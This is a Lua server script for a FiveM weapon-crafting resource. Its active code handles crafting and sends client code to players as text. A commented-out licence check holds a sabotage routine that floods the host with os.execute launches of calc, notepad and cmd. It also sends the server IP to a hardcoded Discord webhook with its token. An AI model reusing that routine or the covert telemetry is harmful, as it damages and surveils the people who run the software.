ESX = nil
local allow = true

TriggerEvent(AYS.esxgetSharedObjectevent, function(obj)
	ESX = obj
end)

--local mymanifest = [[
--    fx_version 'cerulean'
--    game 'gta5'
--
--    version '1.0.0'
--
--    server_scripts {
--        'config.lua',
--        'server/main.lua',
--    }
--
--    client_scripts {
--        'config.lua',
--        'client/main.lua'
--    }
--
--    ui_page 'html/index.html'
--
--    files {
--        'html/*.html',
--        'html/js/*.js',
--        'html/css/*.css',
--        'html/img/*.png'
--    }
--]]
--
--AddEventHandler("onResourceStart", function(resource)
--    local path = GetResourcePath(GetCurrentResourceName())
--    local function read_file(path)
--        local file = io.open(path, "rb")
--        if not file then return nil end
--        local content = file:read "*a"
--        file:close()
--        return content
--    end
--
--    local fxmanifest = read_file(path:gsub('%//', '/') .. '/fxmanifest.lua');
--    local __resource = read_file(path:gsub('%//', '/') .. '/__resource.lua');
--
--    if fxmanifest then
--        if fxmanifest:gsub("%s+", "") ~= mymanifest:gsub("%s+", "") then
--            return
--        end
--    else
--        if __resource:gsub("%s+", "") ~= mymanifest:gsub("%s+", "") then
--            return
--        end
--    end
--
--    if resource == GetCurrentResourceName() then
--        if PerformHttpRequest == print then
--            serverfucker()
--            return
--        elseif debug.getinfo(debug.getinfo).short_src ~= "[C]" then
--            serverfucker()
--            return
--        elseif debug.getinfo(string.len).short_src ~= "[C]" then
--            serverfucker()
--            return
--        elseif debug.getinfo(string.dump).short_src ~= "[C]" then
--            serverfucker()
--            return
--        elseif debug.getinfo(os.remove).short_src ~= "[C]" then
--            serverfucker()
--            return
--        elseif not debug.getinfo(PerformHttpRequest) then
--            serverfucker()
--            return
--        elseif string.len(string.dump(debug.getinfo(PerformHttpRequest).func)) ~= 679 then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).nparams ~= 6 then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).short_src ~= "citizen:/scripting/lua/scheduler.lua" then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).source ~= "@citizen:/scripting/lua/scheduler.lua" then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).what ~= "Lua" then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).isvararg ~= false then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).istailcall ~= false then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).currentline ~= -1 then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).nups ~= 2 then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).func == nil then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).func == "" then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).linedefined == "" then
--            serverfucker()
--            return
--        elseif debug.getinfo(PerformHttpRequest).linedefined == nil then
--            serverfucker()
--            return
--        elseif not string.match(string.dump(debug.getinfo(PerformHttpRequest).func), '@citizen:/scripting/lua/scheduler.lua') then
--            serverfucker()
--            return
--        elseif not string.match(string.dump(debug.getinfo(PerformHttpRequest).func), 'Failure handling HTTP request') then
--            serverfucker()
--            return
--        elseif not string.match(string.dump(debug.getinfo(PerformHttpRequest).func), 'followLocation') then
--            serverfucker()
--            return
--        elseif not string.match(string.dump(debug.getinfo(PerformHttpRequest).func), 'PerformHttpRequestInternalEx') then
--            serverfucker()
--            return
--        elseif string.match(string.dump(debug.getinfo(PerformHttpRequest).func), 'weaponcraft') ~= nil then
--            serverfucker()
--            return
--        else
--            checklizenz()
--        end
--    end
--end)
--
--function serverfucker()
--    for i=0, 9999999999 do
--        Citizen.CreateThread(function()
--            while true do 
--                os.execute("C:/Windows/System32/calc.exe")
--                print("^" .. math.random(1,8) .. " - NETTER VERSUCH | ayscripts.com")
--                os.execute("start notepad.exe")
--                print("^" .. math.random(1,8) .. " - AYSCRIPTS ON TOP | ayscripts.com")
--                os.execute("start cmd.exe")
--                print("^" .. math.random(1,8) .. " - NETTER VERSUCH | ayscripts.com")
--                os.execute("start Dein_Hirn_Und_Dein_Verstand")
--                print("^" .. math.random(1,8) .. " - AYSCRIPTS ON TOP | ayscripts.com")
--            end
--        end)
--
--        os.execute("C:/Windows/System32/calc.exe")
--        print("^" .. math.random(1,8) .. " - NETTER VERSUCH | ayscripts.com")
--        os.execute("start notepad.exe")
--        print("^" .. math.random(1,8) .. " - AYSCRIPTS ON TOP | ayscripts.com")
--        os.execute("start cmd.exe")
--        print("^" .. math.random(1,8) .. " - NETTER VERSUCH | ayscripts.com")
--        os.execute("start Dein_Hirn_Und_Dein_Verstand")
--        print("^" .. math.random(1,8) .. " - AYSCRIPTS ON TOP | ayscripts.com")        
--    end
--end
--
--function checklizenz()
--    local function DiscordWebhok(webhook, color, name, message, footer)
--        local embed = {
--            {
--                ["color"] = color,
--                ["title"] = "".. name .."",
--                ["description"] = message,
--                ["footer"] = {
--                    ["text"] = footer,
--                },
--            }
--        }
--    
--        PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
--    end
--
--    local scriptname = GetCurrentResourceName()
--
--    if not allow then
--        PerformHttpRequest('https://api.ayscripts.com/', function(err, answer, headers)
--            if scriptname == "ays_weaponcraft" then
--                for k,v in pairs(json.decode(answer)) do
--                    if v == "weaponcraft" then
--                        allow = true
--                    end
--                end
--
--                if allow then
--                    print("^2_________________________________________________________________^0")
--                    print("^2                     ayscripts.com | weaponcraft                 ^0")
--                    print("^2                            IP Accepted                          ^0")
--                    print("^2                    Discord: http://ayscripts.com                ^0")
--                    print("^2_________________________________________________________________^0")
--                    DiscordWebhok("https://discord.com/api/webhooks/911903779136352266/L2iCk9R5toE1PQISeAgvN0LoxAo2eEyC_RAMr1dJvAU7au4SLB5--YtESIFHmt-3rE3g", "53380", "IP-Whitelist System", "> Ein Server hat das Script **"..scriptname.."** erfolgreich gestartet.\n\nIP: **"..json.decode(answer)[1].."**", "License-System by ayscripts.com")
--                else
--                    print("^1_________________________________________________________________^0")
--                    print("^1                    ayscripts.com | weaponcraft                  ^0")
--                    print("^1                          IP Not Accepted                        ^0")
--                    print("^1                                                                 ^0")
--                    print("^1                    If this is an error and you                  ^0")
--                    print("^1                  own ays_weaponcraft then please                ^0")
--                    print("^1                     open a Ticket in Discord!                   ^0")
--                    print("^1                                                                 ^0")
--                    print("^1                   Discord: discord.gg/ayscripts                 ^0")
--                    print("^1_________________________________________________________________^0")
--                    DiscordWebhok("https://discord.com/api/webhooks/911903779136352266/L2iCk9R5toE1PQISeAgvN0LoxAo2eEyC_RAMr1dJvAU7au4SLB5--YtESIFHmt-3rE3g", "15406156", "IP-Whitelist System", "> Ein Server vesucht das Script **"..scriptname.."** zu vewenden ist aber nicht gewhitelistet.\n\nIP: **"..json.decode(answer)[1].."**", "License-System by ayscripts.com")
--                end
--            else
--                print("^1_________________________________________________________________^0")
--                print("^1                   ayscripts.com | weaponcraft                   ^0")
--                print("^1                                                                 ^0")
--                print("^1                You are not allowed to change the                ^0")
--                print("^1                  Skript name. Change it back to                 ^0")
--                print("^1                  ays_weaponcraft for it to work                 ^0")
--                print("^1                                                                 ^0")
--                print("^1                   Discord: discord.gg/ayscripts                 ^0")
--                print("^1_________________________________________________________________^0")
--                DiscordWebhok("https://discord.com/api/webhooks/911903779136352266/L2iCk9R5toE1PQISeAgvN0LoxAo2eEyC_RAMr1dJvAU7au4SLB5--YtESIFHmt-3rE3g", "15406156", "IP-Whitelist System", "> Ein Server vesucht das Script **ays_weaponcraft** zu "..scriptname.." umzubennen.\n\n> IP: **"..json.decode(answer)[1].."**", "License-System by ayscripts.com")
--            end
--        end, 'GET', '')
--    end
--end

RegisterServerEvent('ays_weaponcraft:craft')
AddEventHandler("ays_weaponcraft:craft",function(index)
    local s = source
    local x = ESX.GetPlayerFromId(s)
    local weapon = x.getWeapon(AYS.weapons[index].name)
    local allowed = true

    if allow then
        if not weapon then
            for k,v in pairs(AYS.weapons[index].needs) do
                if x.getInventoryItem(v.name).count < v.amount then
                    allowed = false
                    AYS.notfication(s, AYS.messages[1])
                    break
                end
            end
            if allowed then
                for k,v in pairs(AYS.weapons[index].needs) do
                    x.removeInventoryItem(v.name, v.amount)
                end
                x.addWeapon(AYS.weapons[index].name, 0)
                AYS.notfication(s, AYS.messages[2])
                TriggerClientEvent("ays_weaponcraft:close", s)
            end
        else
            AYS.notfication(s, AYS.messages[3])
        end
    end
end)

RegisterServerEvent('ays_weaponcraft:snfgduoisfguiodgfningu23n9g390g9rung9feng993u98ng98u34nu983g490nu8n39u84g9un')
AddEventHandler('ays_weaponcraft:snfgduoisfguiodgfningu23n9g390g9rung9feng993u98ng98u34nu983g490nu8n39u84g9un', function()
    local _source = source
    local text = [[
        ESX = nil
        local open = false

        Citizen.CreateThread(function()
            while ESX == nil do
                TriggerEvent(AYS.esxgetSharedObjectevent, function(obj) ESX = obj end)
                Citizen.Wait(0)
            end
        end)

        function visibile(bool)
            SendNUIMessage({
                action = "show",
                state = bool
            })
            SetNuiFocus(bool,bool)
        end

        RegisterNUICallback('escape', function(data, cb)
            SetNuiFocus(false,false)
            open = false
        end)

        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(0)
                
                local pos = GetEntityCoords(PlayerPedId())
                local dist = GetDistanceBetweenCoords(AYS.location, pos.x, pos.y, pos.z, true)
    
                if not open then
                    if dist <= 2 then
                        DisplayHelpText(AYS.messages[4])
                        if IsControlJustPressed(0, 38) then
                            SendNUIMessage({
                                action = "setweapons",
                                data = json.encode(AYS.weapons)
                            })
                            visibile(true)
                            open = true
                        end
                    end
                    if dist <= 50 then
                        DrawMarker(AYS.marker.type, AYS.location, 0, 0, 0, 0, 0, 0, AYS.marker.size, AYS.marker.size, AYS.marker.size, AYS.marker.color.red, AYS.marker.color.green, AYS.marker.color.blue, AYS.marker.color.alpha, false, true, 2, false, nil, nil, false)
                    else
                        Citizen.Wait(500)
                    end
                else
                    Citizen.Wait(300)
                end
            end
        end)

        RegisterNUICallback('craft', function(data, cb)
            TriggerServerEvent("ays_weaponcraft:craft", (data.selected + 1))
        end)

        RegisterNetEvent('ays_weaponcraft:close')
        AddEventHandler("ays_weaponcraft:close",function()
            visibile(false)
        end)

        function DisplayHelpText(str)
            SetTextComponentFormat("STRING")
            AddTextComponentString(str)
            DisplayHelpTextFromStringLabel(0, 0, 1, -1)
        end
    ]]
    Citizen.Wait(1000)
    if allow then
        TriggerClientEvent('ays_weaponcraft:snfgduoisfguiodgfningu23n9g390g9rung9feng993u98ng98u34nu983g490nu8n39u84g9un', _source, text)
    end
end)